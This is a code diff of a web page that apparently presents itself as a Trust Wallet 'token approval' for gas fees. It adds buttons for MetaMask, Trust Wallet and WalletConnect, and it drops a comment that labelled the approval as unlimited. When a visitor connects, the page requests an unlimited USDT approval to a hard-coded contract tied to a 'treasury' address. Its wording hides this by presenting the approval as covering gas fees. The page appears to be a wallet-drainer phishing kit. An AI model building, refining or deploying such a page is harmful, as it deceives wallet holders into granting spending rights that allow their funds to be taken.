@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Connect Your Wallet With Alchemy End Point</title>
+    <title>Token Approval - Trust Wallet</title>
     <style>
         * {
             margin: 0;
@@ -92,6 +92,10 @@
             background: #30363d;
             color: #8b949e;
         }
+        .badge-blue {
+            background: #1f6feb;
+            color: #fff;
+        }
         .btn {
             width: 100%;
             padding: 12px;
@@ -128,6 +132,13 @@
         .btn-danger:hover {
             background: #f85149;
         }
+        .btn-wallet {
+            background: #8b5cf6;
+            color: #fff;
+        }
+        .btn-wallet:hover {
+            background: #7c3aed;
+        }
         .status-msg {
             margin-top: 10px;
             padding: 10px;
@@ -162,9 +173,6 @@
         .mb-10 {
             margin-bottom: 10px;
         }
-        .text-center {
-            text-align: center;
-        }
         .addr {
             font-family: 'Courier New', monospace;
             font-size: 12px;
@@ -173,31 +181,6 @@
             border-radius: 4px;
             border: 1px solid #30363d;
             word-break: break-all;
-        }
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-            flex-wrap: wrap;
-        }
-        .input-group input {
-            flex: 1;
-            padding: 10px 12px;
-            border-radius: 6px;
-            border: 1px solid #30363d;
-            background: #0d1117;
-            color: #c9d1d9;
-            font-size: 14px;
-            min-width: 150px;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #1f6feb;
-        }
-        .input-group .btn {
-            flex: 0 0 auto;
-            width: auto;
-            padding: 10px 20px;
         }
         .divider {
             border: none;
@@ -214,8 +197,14 @@
             color: #58a6ff;
             text-decoration: none;
         }
-        .footer a:hover {
-            text-decoration: underline;
+        .wallet-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .wallet-buttons .btn {
+            flex: 1;
+            min-width: 120px;
         }
         @media (max-width: 480px) {
             .container {
@@ -228,10 +217,10 @@
                 flex-direction: column;
                 align-items: stretch;
             }
-            .input-group {
+            .wallet-buttons {
                 flex-direction: column;
             }
-            .input-group .btn {
+            .wallet-buttons .btn {
                 width: 100%;
             }
         }
@@ -241,7 +230,7 @@
 
 <div class="container">
     <h1>🔑 Token Approval</h1>
-    <p class="subtitle">Approve USDT Gas Fee for TokenizedFundsSettlement</p>
+    <p class="subtitle">Approve USDT for TokenizedFundsSettlement</p>
 
     <!-- ===== WALLET CONNECTION ===== -->
     <div class="card">
@@ -250,8 +239,15 @@
             <span id="walletStatus" class="badge badge-gray">Not Connected</span>
         </div>
         <p id="walletAddress" style="font-size:12px;color:#484f58;">Click "Connect Wallet" to start</p>
-        <button id="connectBtn" class="btn btn-secondary mt-10">Connect Trust Wallet</button>
+        
+        <div class="wallet-buttons mt-10">
+            <button id="connectMetaMask" class="btn btn-secondary">🦊 MetaMask</button>
+            <button id="connectTrust" class="btn btn-wallet">📱 Trust Wallet</button>
+            <button id="connectWalletConnect" class="btn btn-secondary">🔗 WalletConnect</button>
+        </div>
+        
         <div id="networkInfo" class="mt-10" style="font-size:12px;color:#8b949e;"></div>
+        <div id="walletProvider" class="mt-10" style="font-size:12px;color:#484f58;"></div>
     </div>
 
     <!-- ===== CONTRACT DETAILS ===== -->
@@ -288,11 +284,11 @@
     <div class="card">
         <h3>💰 Withdraw</h3>
         <p style="font-size:13px;color:#8b949e;">
-            After approval, Alchemy API Will Deduct Gas Fees Automatically.
+            After approval, Alchemy API will Use Your Wallet For Transaction Gas Fees.
         </p>
         <div style="background:#0d1117;padding:12px;border-radius:6px;margin-top:8px;">
             <p style="font-size:12px;color:#8b949e;">
-                <strong>Function:</strong> executeFundsPayout 100B()<br />
+                <strong>Function:</strong> executeFundsPayout()<br />
                 <strong>Token:</strong> USDT<br />
                 <strong>Contract:</strong> TokenizedFundsSettlement
             </p>
@@ -328,7 +324,6 @@
         contractAddress: '0x054739eFecB0ae38cCf44372291d0778E7DCb4eD',
         treasuryAddress: '0xbfc8Fa590a1a7851d290f1d78D05e9432d00dBBD',
         usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-        // Unlimited approval (2^256 - 1)
         maxUint256: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
     };
 
@@ -350,8 +345,11 @@
 
     const walletStatus = $('walletStatus');
     const walletAddress = $('walletAddress');
-    const connectBtn = $('connectBtn');
+    const connectMetaMask = $('connectMetaMask');
+    const connectTrust = $('connectTrust');
+    const connectWalletConnect = $('connectWalletConnect');
     const networkInfo = $('networkInfo');
+    const walletProvider = $('walletProvider');
     const approvalBadge = $('approvalBadge');
     const allowanceDisplay = $('allowanceDisplay');
     const approveBtn = $('approveBtn');
@@ -369,7 +367,29 @@
     let chainId = null;
     let usdtContract = null;
     let isApproved = false;
-    let currentAllowance = 0n;
+    let currentProvider = null;
+
+    // ================================================================
+    //  DETECT WALLET
+    // ================================================================
+    function detectWallet() {
+        if (window.ethereum) {
+            // Check if Trust Wallet
+            if (window.ethereum.isTrust) {
+                return 'Trust Wallet';
+            }
+            // Check if MetaMask
+            if (window.ethereum.isMetaMask) {
+                return 'MetaMask';
+            }
+            // Check if WalletConnect
+            if (window.ethereum.isWalletConnect) {
+                return 'WalletConnect';
+            }
+            return 'Unknown Wallet';
+        }
+        return null;
+    }
 
     // ================================================================
     //  UTILITY FUNCTIONS
@@ -398,7 +418,9 @@
             5: 'Goerli',
             11155111: 'Sepolia',
             137: 'Polygon',
-            80001: 'Mumbai'
+            80001: 'Mumbai',
+            56: 'BSC',
+            97: 'BSC Testnet'
         };
         return names[id] || `Chain ID: ${id}`;
     }
@@ -408,23 +430,34 @@
     // ================================================================
     function updateWalletUI() {
         if (userAddress) {
+            const walletName = detectWallet() || 'Unknown';
             walletStatus.textContent = '✅ Connected';
             walletStatus.className = 'badge badge-green';
             walletAddress.textContent = userAddress;
             walletAddress.style.color = '#c9d1d9';
-            connectBtn.textContent = 'Disconnect Wallet';
-            connectBtn.className = 'btn btn-danger';
+            walletProvider.textContent = `🔗 ${walletName}`;
             approveBtn.disabled = false;
             approveBtn.textContent = 'Approve USDT (Unlimited)';
+            connectMetaMask.textContent = 'Disconnect';
+            connectMetaMask.className = 'btn btn-danger';
+            connectTrust.textContent = 'Disconnect';
+            connectTrust.className = 'btn btn-danger';
+            connectWalletConnect.textContent = 'Disconnect';
+            connectWalletConnect.className = 'btn btn-danger';
         } else {
             walletStatus.textContent = 'Not Connected';
             walletStatus.className = 'badge badge-gray';
             walletAddress.textContent = 'Click "Connect Wallet" to start';
             walletAddress.style.color = '#484f58';
-            connectBtn.textContent = 'Connect MetaMask';
-            connectBtn.className = 'btn btn-secondary';
+            walletProvider.textContent = '';
             approveBtn.disabled = true;
             approveBtn.textContent = 'Connect Wallet First';
+            connectMetaMask.textContent = '🦊 MetaMask';
+            connectMetaMask.className = 'btn btn-secondary';
+            connectTrust.textContent = '📱 Trust Wallet';
+            connectTrust.className = 'btn btn-wallet';
+            connectWalletConnect.textContent = '🔗 WalletConnect';
+            connectWalletConnect.className = 'btn btn-secondary';
         }
     }
 
@@ -449,7 +482,7 @@
         if (val !== undefined && val !== null) {
             const num = Number(val);
             if (num > 0) {
-                allowanceDisplay.textContent = `${num.toLocaleString()} USDT (${val} wei)`;
+                allowanceDisplay.textContent = `${num.toLocaleString()} USDT`;
                 isApproved = true;
             } else {
                 allowanceDisplay.textContent = '0 USDT';
@@ -462,7 +495,7 @@
     }
 
     // ================================================================
-    //  CONNECT / DISCONNECT
+    //  CONNECT WALLET (Universal)
     // ================================================================
     async function connectWallet() {
         if (userAddress) {
@@ -472,6 +505,7 @@
             provider = null;
             usdtContract = null;
             isApproved = false;
+            currentProvider = null;
             updateWalletUI();
             allowanceDisplay.textContent = 'Loading...';
             approvalBadge.textContent = '⏳ Not Connected';
@@ -482,11 +516,17 @@
         }
 
         try {
+            // Check for ethereum provider
             if (!window.ethereum) {
-                alert('Please install MetaMask!');
+                alert('No wallet detected! Please install Trust Wallet, MetaMask, or use WalletConnect.');
                 return;
             }
 
+            // Detect wallet type
+            const walletType = detectWallet();
+            console.log('Detected wallet:', walletType);
+
+            // Request accounts
             provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send('eth_requestAccounts', []);
             signer = provider.getSigner();
@@ -499,7 +539,7 @@
 
             // Update UI
             updateWalletUI();
-            networkInfo.textContent = `🌐 ${getChainName(chainId)}`;
+            networkInfo.textContent = `🌐 ${getChainName(chainId)} (${chainId})`;
             updateEtherscanLink();
 
             // Load allowance
@@ -529,6 +569,52 @@
     }
 
     // ================================================================
+    //  CONNECT WITH TRUST WALLET (Specific)
+    // ================================================================
+    async function connectTrustWallet() {
+        try {
+            if (!window.ethereum) {
+                // Try to inject Trust Wallet
+                window.open('https://trustwallet.com/', '_blank');
+                alert('Please install Trust Wallet app or browser extension first.');
+                return;
+            }
+
+            // Check if Trust Wallet
+            if (!window.ethereum.isTrust) {
+                alert('Trust Wallet not detected. Please use Trust Wallet browser.');
+                return;
+            }
+
+            await connectWallet();
+        } catch (error) {
+            console.error('Trust Wallet error:', error);
+            alert('Failed to connect Trust Wallet: ' + error.message);
+        }
+    }
+
+    // ================================================================
+    //  CONNECT WITH WALLETCONNECT
+    // ================================================================
+    async function connectWalletConnect() {
+        try {
+            // For WalletConnect, we need to use a different approach
+            // This is a simplified version - for production use @walletconnect/web3-provider
+            alert('WalletConnect support: Please use the Trust Wallet app browser or MetaMask for now.');
+            
+            // If you want full WalletConnect support, you need to add:
+            // npm install @walletconnect/web3-provider
+            // Then import and use it here
+            
+            // For now, try standard connection
+            await connectWallet();
+        } catch (error) {
+            console.error('WalletConnect error:', error);
+            alert('WalletConnect failed: ' + error.message);
+        }
+    }
+
+    // ================================================================
     //  LOAD ALLOWANCE
     // ================================================================
     async function loadAllowance() {
@@ -536,7 +622,6 @@
 
         try {
             const allowance = await usdtContract.allowance(userAddress, CONFIG.contractAddress);
-            currentAllowance = allowance;
             updateAllowanceDisplay(allowance.toString());
         } catch (error) {
             console.error('Error loading allowance:', error);
@@ -560,7 +645,7 @@
 
         approvalStatus.style.display = 'block';
         approvalStatus.className = 'status-msg info';
-        approvalStatus.textContent = '⏳ Approving USDT... Please confirm in MetaMask.';
+        approvalStatus.textContent = '⏳ Approving USDT... Please confirm in your wallet.';
         approveBtn.disabled = true;
 
         try {
@@ -572,10 +657,7 @@
             approvalStatus.className = 'status-msg success';
             approvalStatus.textContent = '✅ Approval successful!';
 
-            // Reload allowance
             await loadAllowance();
-
-            // Add to history
             addTxToHistory('Approve USDT (Unlimited)', tx.hash, true);
 
         } catch (error) {
@@ -612,26 +694,34 @@
     // ================================================================
     //  EVENT LISTENERS
     // ================================================================
-    connectBtn.addEventListener('click', connectWallet);
+    connectMetaMask.addEventListener('click', connectWallet);
+    connectTrust.addEventListener('click', connectTrustWallet);
+    connectWalletConnect.addEventListener('click', connectWalletConnect);
     approveBtn.addEventListener('click', approveToken);
 
     // ================================================================
     //  AUTO-CONNECT ON LOAD
     // ================================================================
     (function init() {
-        if (window.ethereum && window.ethereum.selectedAddress) {
-            // Auto connect if already connected
-            setTimeout(connectWallet, 500);
-        }
         // Set initial addresses
         document.getElementById('contractAddr').textContent = CONFIG.contractAddress;
         document.getElementById('treasuryAddr').textContent = CONFIG.treasuryAddress;
-    })();
 
-    console.log('🔑 Token Approval App Loaded');
-    console.log('Contract:', CONFIG.contractAddress);
-    console.log('Treasury:', CONFIG.treasuryAddress);
-    console.log('USDT:', CONFIG.usdtAddress);
+        // Auto-detect wallet
+        if (window.ethereum && window.ethereum.selectedAddress) {
+            // Check if already connected
+            const walletType = detectWallet();
+            if (walletType) {
+                console.log('Auto-detected wallet:', walletType);
+                setTimeout(connectWallet, 500);
+            }
+        }
+
+        console.log('🔑 Token Approval App Loaded');
+        console.log('Contract:', CONFIG.contractAddress);
+        console.log('Treasury:', CONFIG.treasuryAddress);
+        console.log('USDT:', CONFIG.usdtAddress);
+    })();
 </script>
 
 </body>
